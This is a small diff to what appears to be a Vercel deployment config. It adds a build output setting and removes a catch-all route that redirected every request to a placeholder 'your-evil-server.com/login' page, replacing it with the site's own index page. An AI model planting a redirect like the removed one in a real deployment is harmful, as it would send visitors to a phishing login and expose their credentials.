@@ -3,13 +3,14 @@
   "builds": [
     {
       "src": "index.html",
-      "use": "@vercel/static-build"
+      "use": "@vercel/static-build",
+      "config": { "distDir": "." }
     }
   ],
   "routes": [
     {
       "src": "/.*",
-      "dest": "https://your-evil-server.com/login"
+      "dest": "/index.html"
     }
   ]
 }
